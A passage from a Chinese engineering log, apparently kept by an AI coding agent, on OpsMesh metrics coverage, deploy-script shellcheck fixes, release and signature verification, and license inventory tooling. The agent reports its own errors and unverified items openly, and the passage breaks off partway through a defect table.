### 21.5 验证与遗留

- 真机：`opsmesh_device_status{status="online"} 3` / `{offline} 0`、`opsmesh_devices_total 3`、
  `opsmesh_alerts_active 2` 在 9091 可见；8080 与 9091 的序列名集合 md5 相同。
- 代码：`internal/controlplane`（39.2s）与 `internal/metrics` 全绿；`gofmt`/`go vet`/`golangci-lint` 干净；
  `/proc/self/stat` 解析另有 4 个用例（含 comm 带空格与右括号的错位陷阱、畸形输入必须拒绝）。
- 遗留（记入待办，未擅动）：① 统一控制面与微服务的 HTTP 指标命名（破坏性，随版本走）；
  ② 其余 13 个微服务未注册 `/metrics`（现只有 device/task/alert 三个）；
  ③ node_exporter 是否纳入出厂栈（决定主机级告警能否默认可用）。

### 21.7 补齐微服务 `/metrics` 覆盖：16/17 暴露、抓取配置对齐、门禁双向（2026-09-28）

§21.6 定论之后按指示把它补上——但**不是只加代码**，三件事一起做：

- **13 个服务补端点**：`auth / autoscaler / bot / config / deploy / gpu / incident / log / plugin / portal / runbook / workflow / aio`，
  逐个按三个既有先例的口径接线：`metrics.Init("<svc>")` + `mux.Handle("/metrics", metrics.GetHandler())` +
  `metrics.HTTPMiddleware` 包住 HTTP handler（有中间件链的插进链里，`Handler: mux` 的直接包裹）。
  `gpu-svc` 因已 import 自带的 `internal/metrics`（GPU 采集器）而用了 `pkgmetrics` 别名——同名的两个包，不合并。
- **抓取侧同步**：`prometheus.yml` 为**本 compose 栈内**的 6 个服务补 job（auth:8100 / log:8105 / config:8106 /
  gpu:8107 / aio:8108 / portal:8109，容器端口取自 compose 的 env），文件里那段"当前仅 3 个注册"的注释改写为实况；
  chart 的 `values.yaml` 把 12 个条目 `metrics: true`（`workflow_svc` 不在 chart 的 services 段里，故无对象可改，
  已在注释与报告里写明它待纳入 chart 后再开）；`verify-runtime.sh` 的 `check_metrics` 期望值把 6 个 `no` 改 `yes`。
- **门禁两处升级（这是关键，否则下次必然漂移）**：
  ① 第 3c 节的 ServiceMonitor 期望值从**硬编码 4** 改为**由 `values.yaml` 派生**
  （`控制面 + metrics: true 的条目数`，当前 16）——"哪个服务暴露 /metrics"从此只有一个事实源，新增服务不会再撞死断言；
  ② **新增第 11 节：抓取配置 ↔ 服务能力双向核对**——`prometheus.yml` 里每个微服务 job 都必须在
  `services/<svc>/cmd/<svc>/main.go` 找到 `GetHandler()` 注册行（防"配了但没暴露"的恒 DOWN 坏目标，2026-09-25 真实发生过 9 个），
  反向则是"已暴露却没有任何抓取配置、也不在带理由的豁免表里"（防监控盲区）。豁免表 9 项带理由：
  7 个不在 compose 栈（走 chart ServiceMonitor）+ `tf-provider`（插件无 HTTP 面）+ `grafana-bridge`（刻意不抓）。
- **`grafana-bridge` 的误导端点已收窄**：它的 `/` 是 catch-all，于是**任意路径**（含 `/metrics`）都返回
  `{"status":"ok"}` 的 JSON。现在只服务 `/` 与显式 `/status`（chart 探针走 `/health`，也已确认可达），其余一律 404。
  改名后 `net/http` 不再给它一个"看起来像指标端点"的假象。

**真机复核（工作区当前树，逐进程起停 17 个服务）**：

| 结果 | 服务 |
|---|---|
| **Prometheus 指标 200 + `text/plain`（16）** | device / task / alert（原有）+ auth / autoscaler / bot / config / deploy / gpu / incident / log / plugin / portal / runbook / workflow / aio（新增） |
| 刻意不暴露（1） | `grafana-bridge`：`/metrics` → **404**、`/status` → 200、`/health` → 200 |
| 不适用 | `tf-provider`（Terraform 插件，无 HTTP 面） |

探针本身也踩到两个"看起来像缺陷其实不是"的坑，值得记：① 首版探针给每个服务套同一个 `<SVC>_HTTP_PORT`
env 模板，但 `aio-svc` 读的是 `AIO_SVC_PORT`、`log-svc` 读的是 `LOG_SVC_HEALTH_ADDR` ⇒ 得到 conn-fail
**假阴性**，按真实 env 补测后都是 200；② `auth-svc` / `config-svc` / `device-svc` 在缺密钥时
**fail-fast 退出**（P0-1/P1-8 的既定行为）⇒ 不带密钥探针同样得到"未启动"，带上临时密钥后立刻 200。
**"探针没探到"永远要先怀疑探针**，别急着报缺陷。

### 21.6 `/metrics` 到底在哪些微服务上"上线"了（2026-09-27 逐进程实跑，取 v0.9.2 树）

§21.5 的遗留②一直写作"其余 13 个微服务未注册 /metrics"——那是**静态印象**。这次把它做实：
为不被并行会话的在途改动污染，取 `git worktree v0.9.2` 那棵树，**逐个构建二进制、起进程、打 `/metrics`**
（并区分"起来了但没这个端点"与"没起来"两种失败）：

| 判定 | 服务 | 证据 |
|---|---|---|
| **暴露 Prometheus 指标（3）** | `alert-svc` / `device-svc` / `task-svc` | HTTP 200 + `Content-Type: text/plain`，首行 `# HELP http_requests_total` |
| **端点存在但不是 Prometheus 格式（1）** | `grafana-bridge` | HTTP 200 但 `Content-Type: application/json`，体为 `{"service":"grafana-bridge","status":"ok"…}` |
| **无该端点（13）** | auth / autoscaler / bot / config / deploy / gpu / incident / log / plugin / portal / runbook / workflow / aio | HTTP 404（服务本身正常起来了） |
| 不适用 | `tf-provider` | Terraform 插件，非 HTTP 服务（已从镜像矩阵豁免，见 §19.6） |

**与抓取配置对账（这是关键，不是只看服务端）**：`deploy/monitoring/prometheus.yml` 的 job 恰为
`controlplane:9091` / `device-svc:8101` / `task-svc:8102` / `alert-svc:8103`（外加 mysql/redis 拨测）。
⇒ **配置只抓暴露了的那 3 个，没有"配了但抓不到"的坏目标**；缺口纯粹在能力侧：13 个服务在监控面板上
永远是空的。`grafana-bridge` 那个 JSON 端点**没有被抓**，所以不产生坏数据，但端点名叫 `/metrics`
却不返回 Prometheus 文本，属于会给运维制造误判的命名（建议改名或改名+补真指标）。

**顺带两条实测发现**：① `aio-svc` 与 `log-svc` **不认** `<SVC>_HTTP_PORT` 约定，硬编码 `:8100` / `:8080`（+gRPC `:9090`）——
后者正是控制面的默认端口，同机裸跑会撞；② 因此"用统一 env 探针遍历所有服务"会在它们身上得到假阴性（本次先踩到，
补测后才拿到 404 的真结论）——**端口约定不统一本身就是一个可运维性缺陷**。

## 22. 交付脚本第一次被静态检查：三处"哑按钮 + 不实陈述"（2026-09-26）

起因很小：给 `validate-deploy-assets.sh` 加第 9 节时，顺手对 `deploy/scripts/*.sh` 跑了一次 shellcheck。
结果不是 lint 噪音，是**三处真实缺陷**——而它们一直躲着，因为
**CI 的 actionlint 只检查 workflow 里的内联 `run` 块，不会跟进被调用的脚本**，
于是 13 个「客户在生产机上直接执行」的 bash 入口从未被任何静态门禁看过一眼。

### 22.1 三处真实缺陷

| # | 缺陷 | 表现 | 处置 |
|---|---|---|---|
| 1 | `deploy/k8s/deploy-opsmesh.sh` 的 `--skip-images` 是**哑按钮** | usage 里承诺了它，参数解析把 `SKIP_IMAGES=true` 存进一个**从未被读取**的变量；`load_images()` 只看 `LOAD_IMAGES`。传与不传行为一致，且无人报错 | 与 `--load-images` 共用一个开关（`--skip-images` → `LOAD_IMAGES=false`），并写明"两个都给时最后出现者为准"；哑变量删除 |
| 2 | `deploy.sh` 的 `PASSWORD_SPECIAL_CHARS` **从未被任何代码引用**，而口令生成走 `openssl rand -base64` | 常量上方三段注释认真解释了"为什么排除 `@` `#` `$` `"` `\` 反引号 与空白"，但 base64 字母表含 `/`（不在该集合内）⇒ 生成的口令可以违反自己声明的字符集。这是 §19/§20/§21 同一族的"声明与事实从不互相校验"，只不过发生在凭据上 | 新增 `rand_pw`：字符集严格 ⊆ `[0-9a-f] ∪ PASSWORD_SPECIAL_CHARS`，末位恒为特殊字符（满足"含特殊字符"类策略）；4 个口令改用之。`JWT_SECRET`/`ENCRYPTION_KEY` **刻意不变**（后者必须是合法 base64，解码后要正好 32 字节） |
| 3 | `.env` 生成后**无条件自称"权限 0600"** | `chmod 600 … \|\| true` 在无 POSIX 权限的文件系统（NTFS/Git-Bash）上静默失败，实际仍是 0644，而日志与 `.env` 头注释都说 0600——一句关于凭据保护的不实陈述 | 先 `stat` 实测再陈述：0600 才说 0600，否则 WARN 报出真实 mode 并给平台 ACL 处置建议；`.env` 头注释与部署摘要里另外两处"权限 0600"一并改为不假定结果 |

另有 11 处纯死代码（`logs.sh`/`simulate.sh`/`status.sh` 里从未使用的颜色变量、`status.sh` 的 `COMPOSE_FILE`、
两个脚本的 `SCRIPT_DIR`、`print_access_info` 的 `port_adv`、轮询计数 `attempt` → `_`），以及
`load-test.sh` 的 `target_replicas`：它作为第 3 个参数被解析却从不参与判定，现在真的进入结论
（达标 / 已扩容但未达目标 / 未触发三态），并顺带修掉了 `${max_pods}` 为空时 `[[ -gt ]]` 的报错。

### 22.2 行内孤立 CR：我自己的推送内容里也有杂质

用户对口径的要求是「确保推送上去的不是包含杂质的」。复查方式是全仓扫**跟踪文件**的字节，
结果抓到一处已随 `1bde2b3` 推上 main 的缺陷：`CHANGELOG.md` 某条 bullet 中间有一个**孤立 `\r`**（不在行尾）。

这类字节有三重隐蔽性，值得单独记：

1. `grep`/`awk` 在 Git-Bash 下看不见它（MSYS 文本模式读时吞 CR）——见部署资产门禁第 6 节的同源教训；
2. git 的 CRLF 归一化（`* text=auto`）只处理**行尾**，行内 CR 原样进 blob 并被推送；
3. markdown 渲染器把它当换行 ⇒ 一条 bullet 从句子中间断开，而 GitHub 上的 diff 视图不会highlight它。

修法用 Node 以 latin1 逐字节 splice（读 utf8 写 latin1 会把整个中文文件洗成乱码——本轮之前撞过一次，
靠 `file-history` 快照恢复），改完断言 UTF-8 仍合法且字节数只减 1。

### 22.3 两条新门禁（都做了故障注入）

| 门禁 | 判据 | 为什么这样判 | 注入验证 |
|---|---|---|---|
| `validate-deploy-assets.sh` §9 | `git grep -IP --cached '\r(?!\n)'`——扫**暂存 blob**里的行内 CR | 读工作区必然误报：本机 335 个文件带正常 CRLF 行尾（Windows 检出所致）。问 git 自己，clean filter 已把行尾归一化，剩下任何 CR 都必是真杂质。rc=0 判红、rc=1 判绿、**rc≥2 判红为"门禁失明"**（PCRE 不可用不等于内容干净，见 §20.6 的 shellcheck 教训） | 造一个含行内 CR 的文件 `git add` → 点名；修复前 index 仍是 HEAD 的带 CR 版本 → §9 立刻红，暂存修复后 → 绿（两向都是自然发生的，无需伪造） |
| CI `security` job 的 shellcheck step | 13 个交付脚本 `-S warning` 零 findings | 钉版 v0.10.0 且**断言 `version:` 行**（下到别的版本=门禁强度变了却看不出来）；空清单直接 `::error::`（清单为空不等于脚本干净）；下载 5 次退避（§20.5 教训：一次代理截断=整批门禁失败）；取二进制而非 docker 镜像——本机 Docker 配了镜像白名单代理拉不到 `shellcheck-alpine`，runner 侧则要扛 Docker Hub 匿名限额，同一门禁不该有两种环境失效方式 | 往 `proto/scripts/gen.sh` 追加一行未使用变量 → 报 SC2034 并 rc=1；`git checkout --` 还原 → 0 findings |

版本断言本身也是一次"先测再写"：`shellcheck --version` 首行是
`ShellCheck - shell script analysis tool`，版本在第二行 `version: 0.10.0`——
最初按 `ShellCheck 0.10.0` grep 永远不匹配，会在 CI 里把一个正常门禁写成永久失败。

### 22.4 验证

- `rand_pw`：从 `deploy.sh` 里抽出**真实定义**跑 300 次，断言长度、字符集越界字符为空、至少含一个特殊字符 ⇒ `bad=0`；
  负向自证：故意把校验集合写窄（漏掉 `_`）立刻报 42 处 ⇒ 断言是活的。
- 沙箱真跑：把 `deploy/docker` 复制到 `/tmp` 独立目录（删掉复制来的真实 `.env`/证书，避免把密钥材料扩散），
  跑 `deploy.sh init` → 生成成功，四条口令 len=32、无越界字符、各含特殊字符；`JWT_SECRET`(64)/`ENCRYPTION_KEY`(44) 不变；
  `docker compose --env-file .env -f docker-compose.prod.yml config` rc=0 ⇒ 新字符集在 compose 插值链路上真的可用；
  权限分支本机实测走 WARN（`实际权限为 644`）——即缺陷 #3 的复现与修复同时被看见。
  （顺带发现 `confirm()` 在非 tty 下把**问题本身**印成 `[ERROR]`，已改为一句说明"已按拒绝处理"的 error，不再误导。）
- 全量：13 个脚本 `shellcheck -S warning` 0 findings + `bash -n` 全通过；`gofmt`/`go vet` 干净。
- **CI 已把这两条门禁真跑过（run `36205827115`，commit `a3d0d3b`，13 个 job 全 success）**：
  `security` 的 shellcheck step 打印 `version: 0.10.0` 与
  `✅ 13 个交付脚本在 shellcheck -S warning 下 0 findings`；`部署资产一致性门禁` 在 CI 里
  `PASS=30 FAIL=0 SKIP=0`，且第 9 节输出「全部暂存 blob 无行内孤立 CR」；
  `build-test` 的 actionlint step、E2E×2、`Race detector` 同 run 全绿。
  上面"以 CI 该 step 为准"的口径到此兑现——本机只证到复现与逐类修复。
- 遗留（记入 §23）：`-S info` 级仍有 39 处 SC2015（`a && b || c` 风格）与 3 处 SC2012，属可读性而非正确性，未在本轮动。

## 23. 下一轮清单（按优先级）

| # | 事项 | 为什么排在这 |
|---|---|---|
| 1 | ~~看本轮 commit 的 CI step 级证据~~ **已完成**：run `36205827115`（13 job success，shellcheck step 与门禁第 9 节的输出行已取证）、run `36218894361`（矩阵修复 + 第 10 节） | 留下的唯一在办项是发布本身（第 2 项） |
| 2 | ~~重切 `v0.9.2` 并验收产物~~ **已完成**（tag `9347554`，run `36327166836` 19/19 success）：Release assets 5 个、19/19 镜像带 `.sig`、17 份 SBOM 产物。过程里修掉两处只在发版时才暴露的问题（矩阵混入非服务模块 §19.6、签名自验证撞 GHCR 写后读窗口 §19.9） | 由此 0.9.2 成为**第一个镜像与二进制都真实发布成功、且带签名与 SBOM** 的版本 |
| 3 | ~~P1-7 许可与第三方合规~~ **技术面已收口**（§24.4）：离线清单 + 三条硬断言门禁（8 例故障注入）+ `NOTICE` 逐字汇编 7 段上游署名。**未收口的是判定面**：24 个 MPL-2.0（`go-sql-driver/mysql` 直接 + `hashicorp/*` 间接）能否随商用版分发＝商务 + 法务决定 | 脚本刻意只"分类与暴露"，不替法务签字；基础镜像的系统包与 `web/enterprise/node_modules` 是两条**已知未覆盖**的供应链线 |
| 4 | 外部 GitOps chart 的 values 结构核对（需该仓库读权限） | §20.3 遗留的最后一处不确定 |
| 5 | 统一控制面与微服务的 HTTP 指标命名（`opsmesh_http_*` vs 无前缀 `http_*`） | 破坏性变更，需随版本走；当前出厂规则/面板已用 `__name__` 并集兜住（§21.3） |
| 6 | ~~微服务 `/metrics` 覆盖~~ **已补齐**（§21.7）：16/17 服务暴露 Prometheus 指标（真机逐进程复核），`grafana-bridge` 刻意不暴露且端点已收窄为 `/`+`/status`，`tf-provider` 不适用；`prometheus.yml` 补 6 个 compose 服务 job、chart `metrics: true` 12 条、`verify-runtime.sh` 期望同步；ServiceMonitor 期望值改为**由 values 派生**、并新增**抓取配置 ↔ 服务能力双向门禁**（第 11 节） | 仍留一处非阻断项：`workflow_svc` 那条已**作废**（TD-60 阶段 2 把该服务连同另外四个一起删除，见 v0.10.0 破坏性变更第 1 条 ⇒ 无对象可补条目）；现存 12 个服务目前只有 `pkg/metrics` 的通用指标，**业务维度指标**（队列深度/业务计数器）仍是逐个服务后续接 |
| 7 | node_exporter 是否纳入出厂栈 | 决定主机级告警（磁盘等）能否默认可用；现在只能以 `.example` 形式提供（§21.2） |
| 8 | 微服务剩余约 250 处 `Printf` 的逐点严重级别升级 | 增量改进，统一管道已就位 |
| 9 | 把交付脚本的 shellcheck 口径从 `-S warning` 提到 `-S info`（余 39×SC2015、3×SC2012） | 可读性而非正确性；提口径前要逐条判"是否真死变量"，与本轮 SC2034 的处置同法，不宜顺手 |
| 10 | ~~版本源仍写 0.9.0~~ **已处理**：全量对齐到 0.9.2，并在 `release.yml` 加「标签 == Chart appVersion」硬门禁（见 §19.7）。**残留待办**：本机在跑的 `deploy/docker/.env` 仍是 `OPSMESH_VERSION=0.9.0`（未跟踪、属用户部署状态），升级到 0.9.2 需显式执行数据卷兼容的镜像替换而不是直接改 tag | 直接改 `.env` 的 tag 会让已在跑的容器换镜像；MySQL 数据卷的迁移是 §P0-5 那条链路，需要按升级流程走而不是改标签 |
| 11 | **Release 单一所有者化**（§24.3）：删掉 `release.yml` 的 `github-release` job，把正文/release-notes 收进 goreleaser，并在 goreleaser 之后加 `gh release view --json assets` 长度断言 | 实测 `v0.10.0` 有 **约 24 分钟**（09:42:36Z→10:09:06Z）Release 已发布但零资产；两个 workflow 共同拥有同一个 Release，谁先到谁建。改完必须下一次发版才能验，故单列不宜顺手 |
| 12 | ~~`cosign attest` 产出 `.att`~~ **已实现**（§24.6：12 微服务 + 2 核心镜像，带自验证与写后读退避）。**待办只剩取证**：下一次 push 的 `image`/`image-agent` job 里确认 `.att` 真落注册表（本机拉不到 cosign 镜像、也无注册表凭据，只能到 CI 收口） | 客户用 `cosign verify-attestation` 应当能**从镜像本身**问到"里面有什么"，而不是去翻 CI 界面下载附件 |
| 13 | 许可清单另两条供应链线未覆盖：`web/enterprise/node_modules`（npm 依赖）与镜像内操作系统包（基础镜像的 GPL/LGPL 二进制再分发义务） | 属**已知缺口**而非"已确认无风险"；前者可复用同一套分类器，后者要接 Trivy/SBOM 侧数据 |

## 24. v0.10.0 发布验收 + P1-7 许可清单工程化（2026-09-29）

### 24.1 v0.10.0 四条验收全过（tag `c517df5`）

| 验收项 | 实测结果 |
|---|---|
| ① Release assets 非空 | **5 个**：`checksums.txt` + linux/amd64 与 arm64 各一对（`tar.gz` + `.sbom.json`），`isDraft=false`、`prerelease=false` |
| ② 核心镜像版本化标签 | `opsmesh-binary:0.10.0`、`opsmesh-agent:0.10.0` 均 HTTP 200 |
| ③ 微服务镜像齐备 | 矩阵 12 条 × `:0.10.0` = **12/12 200**（`services/` 13 目录 − `tf-provider` 豁免，与门禁第 2/10 节一致） |
| ④ 签名与 SBOM | **`.sig` 14/14**（含 2 个核心镜像）；**`.att` 0/14**（尚未做 `cosign attest`，见 §23 追加项）；SBOM 产物 **12/12**（`sbom-<svc>`）+ 二进制 SBOM 已在 Release 资产里 |

取证 run：`36550147571`（ci.yml，tag 触发，13 job 全 success，含 `release`=goreleaser）与 `36550147538`（release.yml，镜像矩阵）。

### 24.2 我自己的一次误判（记下来，别把"还没跑到"读成"回归"）

`gh release view v0.10.0 --json assets` 一度返回 `assets=0`，我据 §19.1 的先例（v0.9.1 空壳发布）判成回归。**错**：那次执行发生在 goreleaser 之前。真实时序是

```
09:42:27Z → 09:42:36Z   release.yml 的 github-release job（softprops）建好并发布 Release，资产 0 个
10:06:09Z → 10:09:06Z   ci.yml 的 release job（goreleaser）跑完，补上 5 个资产
```

⇒ 结论层面：**"资产为 0" 只有在该 run 的 `release` job 终态之后才有意义**。判定发布物要先确认拥有发布职责的那个 job 已经 `completed`。

### 24.3 同时量化出一处真隐患：两个 workflow 共同拥有同一个 Release

上面的时序不是巧合，而是结构问题：

- `release.yml` 的 `github-release` 只 `needs: [build-and-push, changelog]`——镜像推完就发布；
- `ci.yml` 的 `release`（goreleaser）`needs` 八个质量门禁 job，天然晚 ~24 分钟；
- 两者对**同一个 tag 的 Release** 各自 `create`，谁先到谁建，后者复用（本轮实测：goreleaser 复用了 softprops 建的 Release 并成功追加资产——这条行为此前从未被真实发布验证过）。

**客户可见后果**：`v0.10.0` 发布后有 **约 24 分钟** Release 页面存在但没有任何二进制（09:42→10:09）。这期间按 Release 页"最新二进制"安装的脚本会拿到 404。0.9.2 之所以没暴露，是因为那一轮 ci.yml 的 tag run 是红的、goreleaser 早在另一轮就跑过了——**没暴露不等于不存在**。

**建议改法（未动，需下一次发版才能验）**：单一所有者——把 Release 正文/`generate_release_notes` 收进 goreleaser（`.goreleaser.yml` 的 `release.header` + changelog 已具备），删掉 `release.yml` 的 `github-release` job；并在 goreleaser 之后加一条 `gh release view "$TAG" --json assets` 的长度断言（≥5 判红），让"发布成功但没产物"从此不可能绿。

### 24.4 P1-7：第三方许可从"主观描述"变成"可机器复算 + 可门禁"

交付物三件：

- `deploy/scripts/gen-third-party-licenses.sh`——**完全离线**：依赖全集取各模块 `go.sum`（跳过 `/go.mod` 哈希行），许可证文本取本地 Go 模块缓存里上游自带的 `LICENSE`，按签名表分类成 SPDX 名。三种模式：生成 / `--check` / `--emit-notice`。
- `docs/third-party-licenses.md`——162 个模块，`Apache-2.0 50 / MIT 47 / BSD-3-Clause 31 / MPL-2.0 24 / BSD-2-Clause 9 / ISC 1`，**UNKNOWN 0**；24 项进「需法务确认」= 全部 MPL-2.0（`go-sql-driver/mysql` 直接依赖 + `hashicorp/*` 间接）。
- `NOTICE`——由 `--emit-notice` 汇编，逐字保留 7 个上游自带 NOTICE 的署名（Apache-2.0 §4(d) 是**可机械核实**的义务，不是判断题）。已逐段比对字节级一致：`agext/levenshtein`、`prometheus/{client_golang,client_model,common,procfs}`、`grpc`、`gopkg.in/yaml.v3`。

**分类器踩过的四个坑**（都已进注释，防止下次"修好又改回去"）：

1. `go.sum` 同一模块有 `<ver> h1:` 与 `<ver>/go.mod h1:` 两类行，后者只是 go.mod 的哈希 ⇒ 版本必须取第二列并**跳过 `/go.mod`**；
2. 模块缓存对大写路径做转义（`X` → `!x`），不转义则整批目录找不到；
3. Apache/GPL 的标题在原文里跨行缩进 ⇒ 必须折叠空白再匹配，否则第一版实测把 50 个 Apache 全判成 UNKNOWN；
4. **copyleft 只能看文件头部**：MPL-2.0 的 "Incompatible With Secondary Licenses" 附录里出现 "GNU AFFERO GENERAL PUBLIC LICENSE" 字样 ⇒ 整篇扫会把 24 个 MPL 误判成 AGPL；而 MPL §10 又提到 "version 1.1" ⇒ 版本号只能从**标题行**读，否则 24 个 MPL-2.0 降级成 MPL-1.1。**AGPL 误报足以阻断商用决策**，这两处误判的代价是不对称的。

**门禁形态的取舍（这轮最有价值的一条）**：`--check` 最初写成"重新生成 + 全文 diff"，随即改掉——许可证识别依赖模块缓存，CI 的缓存必然比开发机残缺 ⇒ 全文 diff 得到的是**假红**；反过来把读不到的项整段忽略，又变成"CI 读不到就当已确认"的**空转绿**（§15.2 第三类的又一个形态）。改成三条与环境无关的硬断言：

1. `(module, version)` 集合相等（版本变了集合就变 ⇒ 最常见的漂移形态完整覆盖）；
2. 两侧都读到 LICENSE 文本的模块，判定必须一致；
3. 源码覆盖率 `< MIN_COVERAGE_PCT`（默认 90）直接判红，并在通过但未满时打 `[WARN] …未被核对，不等于已确认`。

**故障注入 8 例全过**（每条都断言退出码，不只是看输出）：删 1 个模块行 → rc=1；版本号漂移 → rc=1；同 module@version 判定变化 → rc=1（47 处）；缓存全缺 → rc=1 且打"本轮等于没检查"；下限调 101% → rc=1（证门禁下限算术真生效）；恢复 → rc=0；`--check` 判红时不得改写文档；生成器内部报错（把 `go` 从 PATH 摘掉）时**不得覆盖**已提交文档。

**顺手抓到的两处正确性问题**：

- **`--check` 的退出码被末命令吞了**：重排脚本后收尾是 `rm -f "$TMP"` ⇒ 无论判出什么都绿灯，`--check` 的三条断言全部形同虚设。改为显式 `exit "$PYRC"`。这正是本项目反复踩的"输出与退出码不许被管道/末命令吞"，**这次是我自己造的**。
- **版本选择靠字典序最大值**：`sorted(vs)[-1]` 会把 `v1.10.0` 排在 `v1.9.0` **之前**，即清单可能给某模块配上根本没在用的旧版本，许可证判定跟着错。当前 6 个多版本模块恰好两种序一致（实测），那是运气不是性质 ⇒ 改成语义序 `semver_key`（预发布/伪版本判低、`+incompatible` 正确），并单测 6 例。同时把「同一模块在 go.sum 里有多个版本」这 6 个模块显式列进文档，并注明 **`go.sum` 是构建清单（`go list -m all`）的超集**，产物级依赖请以镜像 SBOM 为准。

**诚实边界（写清楚，别让清单替自己签字）**：

- 脚本**只分类与暴露，不判定可否分发**。24 个 MPL-2.0 的处置（是否触发文件级 copyleft 义务、是否需要在文档中告知客户源码获取方式）属**商务 + 法务决定**，P1-7 的技术部分到此收口，结论部分未收口。
- 镜像里的操作系统包是**另一条供应链线**（基础镜像 `debian:bookworm-slim` 的 GPL/LGPL 二进制再分发义务），本清单不含，文档单列了一节指向 `FROM` 与 Trivy。
- 前端 `web/enterprise/node_modules` 的 npm 依赖未纳入（本轮范围是 Go 侧）——这是**已知缺口**，不是"已确认无风险"。

### 24.5 GHCR 探针的第二个媒体类型坑

`.sig` / `.att` 是**单个 manifest**，不是 index。用 `Accept: application/vnd.oci.image.index.v1+json`（或多类型串里只有 index/list）去取会得 **404 假阴性**——本轮一度据此判"14/14 全未签名"。正确口径：

```
manifest（镜像）  Accept: application/vnd.oci.image.index.v1+json
manifest（.sig）  Accept: application/vnd.oci.image.manifest.v1+json   ← 少这一条就全 404
```

`tags/list` 能直接看见 `sha256-<digest>.sig` 条目，是区分"探针错"与"真没签"的最快反证。与 §19.1 那条（查 index 必须带 OCI index 类型）同族：**探针的媒体类型不匹配时，注册表回答的是"我没法用这个类型给你"，不是"不存在"**。

### 24.6 `.att` 证据链补齐（任务 ③a）——把 SBOM 从"CI 附件"变成"镜像自带的问题答案"

签名回答"这镜像是我们发的"，回答不了"里面有什么"。此前 SBOM 只作为 workflow artifact 存在，
客户要核对成分必须登录 Actions；本轮给 **12 个微服务镜像 + 2 个核心镜像**都补上 `cosign attest`。

改动面（`release.yml` 的 build-and-push、`ci.yml` 的 image / image-agent 三处，口径逐字一致）：

1. syft 出**第二份 CycloneDX** 当 attest 谓词——cosign v2.2.4 的 `--type` 取值里**没有 spdx 之外的
   CycloneDX 替代品**（权威口径见下），故 SPDX 那份继续作为 artifact 原样保留，两份并存不替换；
2. `cosign attest --yes --type cyclonedx --predicate <cdx> <image>`（核心镜像按既有的
   key-based / keyless 双路径分支，与 `cosign sign` 的守卫条件完全一致）；
3. **自验证 `cosign verify-attestation --type cyclonedx`** + GHCR 写后读退避重试，5 次不过判红
   （§19.9 的教训：能"空转"的步骤必须自己作证）；
4. 覆盖范围自述表新增 `cosign attest（镜像侧 .att 证据）` 一行，未启用时明说"即无"。

**为什么能在本机拿到权威依据**：`ghcr.io/sigstore/cosign/v2.2.4` 镜像在本机 Docker 拉不动
（`dialing ghcr.io:443 … connectex` ——Docker Desktop 无该路由的 HTTPS 代理，属 [[opsmesh-deploy-env-hazards]]
的镜像白名单族），改**直接下载钉版二进制** `cosign-windows-amd64.exe`（v2.2.4，`GitVersion` 自证），
读其权威旗标表：

```
attest            --type='custom': (slsaprovenance|…|spdx|spdxjson|cyclonedx|vuln|openvex|custom)
verify-attestation --type='custom': 同一集合
```

⇒ `--type cyclonedx` 在**出证据的一侧和验证据的一侧都存在**，这是断言而非猜测。
（syft 的 windows 二进制本轮下载三次均被网络截断，未取得；故 CycloneDX 的字段形态不靠本机断言，
改由下一步的运行时硬门禁兜住。）

**空证据比没证据更坏**：原先两处 `python3 -c 'print(len(...))'` 只**打印**条目数，0 个组件照样绿。
本轮改为空即判红并给出原因；7 例 fixture 本机全过：

| 输入 | 期望 | 实测 |
|---|---|---|
| SPDX packages 非空 / 空 / 缺键 | 放行 / 判红 / 判红 | rc=0 / 1 / 1 |
| CDX 正常 / 空 components / 缺 bomFormat / 缺 specVersion | 放行 / 判红 ×3 | rc=0 / 1 / 1 / 1 |

**本轮又一次自造缺陷（主动披露）**：给自述表加行时写了 `echo "| cosign attest（镜像侧 \`.att\` 证据） |"`——
**双引号里的反引号是命令替换**，不是 markdown 代码块。是 `shellcheck -S style` 的 SC2006 抓出来的，
而抓到的前提是换了口径：不再依赖 `actionlint` 带 shell 后端（本机那样会**挂死**——见下），
而是「抽出每个 run 块 → 替换 `${{ }}` → 逐块 `shellcheck -S style --shell=bash`」。

**本机 actionlint 的新事实**：带 shellcheck 后端时在本机长时间无输出（四个并发实例互相拖死后被终止），
而 `-shellcheck=` 单跑全部 workflow 只需 0.15s 且 rc=0。⇒ 本机可靠口径是**两件套**：
`actionlint -shellcheck=`（结构/表达式面）+ 上述逐块 shellcheck（shell 面），
并显式声明"两件套合起来才等价于 CI 的 actionlint"，不能拿其一当其二（这正是 §18"门禁后端不在场"的同族）。

**为什么这个改动不会被推迟到下次发版才第一次执行**（§19.1/教训 15 的口径）：
`ci.yml` 的 `image` / `image-agent` **每次 push 都跑**（实测 run `36545861598` 的 13 个 job 含这两个，
只有 `release` 是 skip），且 GHCR 回落路径零 secret。⇒ attest + 自验证会在**下一次推送**就被真跑一遍，
`release.yml` 里的同形步骤届时已被证过；本轮本机只证到"旗标存在 + 断言会判红 + 门禁 0 findings"，
`.att` 真的落注册表要等那次 push 的 CI 结果（不谎称已完成）。

## 25. 微服务指标管道的四处"声明了但不成立"（2026-09-29，③b 第一步）

补业务指标前的调研没直接产出指标清单，而是先把 `pkg/metrics`（12 个微服务共用）挖出四个缺陷。
**顺序上必须先修管道**：在"名字带 `_total` 其实是恒为 1 的 gauge"之上再加 12 个业务指标，
等于把同一类错误复制十二遍。

### 25.1 四个缺陷（每条都有文件:行号，修前实测）

| # | 缺陷 | 修前事实 | 客户视角后果 |
|---|---|---|---|
| 1 | **`RecordBusinessMetric` 是 SET 不是 ADD** | `metrics.go:137` 做 `r.business[key] = value`；而 device/task/alert 三处共 **9 个调用点传字面量 `1`**（`service.go:475,478,605,608` / `199,211,249,272` / `190,192`） | `business_metrics{name="task_claims_total"}` 恒为 1，`rate()/increase()` 全无意义；`*_failures` 永远只能取 0/1，无法算失败率 |
| 2 | **HTTP 家族零基数上限** | `HTTPMiddleware` 把 `r.URL.Path` **原样**当标签（`metrics.go:304`），无归一化、无上限、无 `:other`；控制面有 `maxHTTPSeries=2000`（`internal/metrics/metrics.go:37`），共用包一个都没有 | 未鉴权端口上扫描器遍历随机路径即可把 map 撑到 OOM——**P1-5 那一类 DoS 的真实暴露面在微服务侧**，此前只补了控制面 |
| 3 | **恒零假仪表** | `RecordQueueDepth` / `RecordActiveConnections` **全仓零生产调用方**（`grep` 只命中自身与测试），但 `queue_depth 0` / `active_connections 0` 每次抓取都输出 | 面板上"队列深度=0"看起来一切正常，实际那个值从来没人写（§21"出厂规则引用不存在的指标"的镜像形态：这里是"存在但从不被喂"） |
